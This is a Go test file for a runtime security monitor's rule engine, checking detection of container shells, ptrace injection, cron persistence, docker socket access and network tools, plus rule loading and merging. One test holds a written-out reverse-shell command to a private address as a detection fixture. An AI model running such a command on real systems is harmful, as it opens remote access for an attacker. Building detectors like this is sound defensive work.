package ruleengine

import (
	"testing"

	"kernelwatch/internal/alerter"
	"kernelwatch/internal/collector"
)

func byID(rs []Result, id string) *Result {
	for i := range rs {
		if rs[i].RuleID == id {
			return &rs[i]
		}
	}
	return nil
}

func mustEngine(t *testing.T) *Engine {
	t.Helper()
	e, err := LoadDefault()
	if err != nil {
		t.Fatalf("LoadDefault: %v", err)
	}
	return e
}

func execEvt(path, cmd string, anc []string) collector.Event {
	return collector.Event{Type: collector.EventExecve, Filename: path, CmdLine: cmd, ProcessName: base(path), Ancestry: anc}
}
func openEvt(path string, flags uint64, comm string) collector.Event {
	return collector.Event{Type: collector.EventOpen, Filename: path, Arg1: flags, ProcessName: comm}
}
func base(p string) string {
	for i := len(p) - 1; i >= 0; i-- {
		if p[i] == '/' {
			return p[i+1:]
		}
	}
	return p
}

func TestLoadDefaultCompiles(t *testing.T) {
	e := mustEngine(t)
	if len(e.Rules()) != 17 {
		t.Fatalf("expected 17 default rules, got %d", len(e.Rules()))
	}
}

func TestShellMatrix(t *testing.T) {
	e := mustEngine(t)
	// network-facing parent => critical
	if r := byID(e.Match(execEvt("/bin/bash", "bash", []string{"nginx"}), fakeLP{}, ScopeContainer), "shell_in_container"); r == nil || r.Severity != alerter.SeverityCritical {
		t.Fatalf("nginx->bash should be critical, got %#v", r)
	}
	// trusted parent => suppressed
	if r := byID(e.Match(execEvt("/bin/bash", "bash", []string{"cron"}), fakeLP{}, ScopeContainer), "shell_in_container"); r != nil {
		t.Fatalf("cron->bash should be suppressed, got %#v", r)
	}
	// unknown parent => high
	if r := byID(e.Match(execEvt("/bin/bash", "bash", []string{"weird"}), fakeLP{}, ScopeContainer), "shell_in_container"); r == nil || r.Severity != alerter.SeverityHigh {
		t.Fatalf("weird->bash should be high, got %#v", r)
	}
}

func TestHostShellFromService(t *testing.T) {
	e := mustEngine(t)
	rs := e.Match(execEvt("/bin/bash", "bash", []string{"nginx"}), fakeLP{}, ScopeHost)
	if r := byID(rs, "host_shell_from_service"); r == nil || r.Severity != alerter.SeverityCritical {
		t.Fatalf("expected critical host_shell_from_service, got %#v", r)
	}
	// shell_in_container is container-only: must not appear on host
	if r := byID(rs, "shell_in_container"); r != nil {
		t.Fatal("shell_in_container must not fire on host scope")
	}
	// interactive admin shell on host => nothing
	rs2 := e.Match(execEvt("/bin/bash", "bash", []string{"sshd"}), fakeLP{}, ScopeHost)
	if len(rs2) != 0 {
		t.Fatalf("interactive host shell should be silent, got %#v", rs2)
	}
}

func TestReverseShellAndInjection(t *testing.T) {
	e := mustEngine(t)
	rev := execEvt("/bin/bash", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", []string{"cron"})
	if r := byID(e.Match(rev, fakeLP{}, ScopeContainer), "reverse_shell"); r == nil || r.Severity != alerter.SeverityCritical {
		t.Fatalf("reverse_shell should be critical regardless of lineage, got %#v", r)
	}
	pt := collector.Event{Type: collector.EventPtrace, Arg1: 16, Arg2: 999}
	if r := byID(e.Match(pt, fakeLP{}, ScopeContainer), "process_injection"); r == nil || r.Severity != alerter.SeverityHigh {
		t.Fatalf("ptrace ATTACH should be high, got %#v", r)
	}
	if r := byID(e.Match(collector.Event{Type: collector.EventPtrace, Arg1: 0}, fakeLP{}, ScopeContainer), "process_injection"); r != nil {
		t.Fatal("PTRACE_TRACEME must not fire")
	}
}

func TestPersistenceAndDocker(t *testing.T) {
	e := mustEngine(t)
	// container write to cron dir => persistence
	if r := byID(e.Match(openEvt("/etc/cron.d/x", 0x1|0x40, "python3"), fakeLP{}, ScopeContainer), "persistence"); r == nil {
		t.Fatal("expected persistence for cron write")
	}
	// read-only must not fire
	if r := byID(e.Match(openEvt("/etc/crontab", 0, "cat"), fakeLP{}, ScopeContainer), "persistence"); r != nil {
		t.Fatal("read-only cron open must not fire persistence")
	}
	// host docker.sock by non-docker => high; by dockerd => suppressed
	if r := byID(e.Match(openEvt("/var/run/docker.sock", 0x2, "python3"), fakeLP{}, ScopeHost), "host_docker_sock"); r == nil || r.Severity != alerter.SeverityHigh {
		t.Fatalf("python->docker.sock should be high, got %#v", r)
	}
	if r := byID(e.Match(openEvt("/var/run/docker.sock", 0x2, "dockerd"), fakeLP{}, ScopeHost), "host_docker_sock"); r != nil {
		t.Fatal("dockerd->docker.sock should be suppressed")
	}
}

func TestNetworkToolMatrix(t *testing.T) {
	e := mustEngine(t)
	if r := byID(e.Match(execEvt("/usr/bin/curl", "curl x", []string{"php-fpm"}), fakeLP{}, ScopeContainer), "network_tool"); r == nil || r.Severity != alerter.SeverityHigh {
		t.Fatalf("curl under php-fpm should be high, got %#v", r)
	}
	if r := byID(e.Match(execEvt("/usr/bin/curl", "curl x", []string{"cron"}), fakeLP{}, ScopeContainer), "network_tool"); r != nil {
		t.Fatal("curl under cron should be suppressed")
	}
	if r := byID(e.Match(execEvt("/usr/bin/curl", "curl x", []string{"weird"}), fakeLP{}, ScopeContainer), "network_tool"); r == nil || r.Severity != alerter.SeverityMedium {
		t.Fatalf("curl unknown lineage should be medium, got %#v", r)
	}
}

// ── loader / merge / validation ───────────────────────────────────────────────

func TestKnownFieldsRejectsUnknownKey(t *testing.T) {
	_, err := parseFile([]byte("rules:\n  - id: x\n    bogus: y\n"), "test")
	if err == nil {
		t.Fatal("expected unknown-field rejection")
	}
}

func TestMergeOverrideAndAppend(t *testing.T) {
	base, err := DefaultFile()
	if err != nil {
		t.Fatal(err)
	}
	over := &File{Rules: []RuleSpec{
		{ID: "reverse_shell", Override: true, Scope: "all", Condition: "evt.type = execve", Severity: "low", Reason: "downgraded"},
		{ID: "shell_in_container", Append: true, Tags: []string{"extra"}},
		{ID: "my_custom", Condition: "evt.type = execve and in_list(proc.exe_base, $shells)", Severity: "medium", Reason: "custom"},
	}}
	if err := base.mergeOver(over); err != nil {
		t.Fatalf("merge: %v", err)
	}
	if err := base.checkUniqueIDs(); err != nil {
		t.Fatal(err)
	}
	rules, err := compileRuleset(base)
	if err != nil {
		t.Fatalf("compile merged: %v", err)
	}
	// override took effect (no lineage arms now), append added a tag, new rule exists
	var sawCustom, sawOverride bool
	for _, r := range rules {
		if r.ID == "my_custom" {
			sawCustom = true
		}
		if r.ID == "reverse_shell" && !r.hasArms && r.severity == alerter.SeverityLow {
			sawOverride = true
		}
	}
	if !sawCustom || !sawOverride {
		t.Fatalf("merge semantics wrong: custom=%v override=%v", sawCustom, sawOverride)
	}
}

func TestDuplicateIDRejected(t *testing.T) {
	f := &File{Rules: []RuleSpec{
		{ID: "dup", Condition: "evt.type = execve", Severity: "low", Reason: "a"},
		{ID: "dup", Condition: "evt.type = open", Severity: "low", Reason: "b"},
	}}
	if err := f.checkUniqueIDs(); err == nil {
		t.Fatal("expected duplicate id rejection")
	}
}

func TestValidateEmbedded(t *testing.T) {
	if err := Validate("", ""); err != nil {
		t.Fatalf("embedded ruleset must validate: %v", err)
	}
}

func TestInvalidSeverityRejected(t *testing.T) {
	f := &File{Rules: []RuleSpec{{ID: "x", Condition: "evt.type = execve", Severity: "bogus", Reason: "r"}}}
	if _, err := compileRuleset(f); err == nil {
		t.Fatal("expected invalid severity rejection")
	}
}
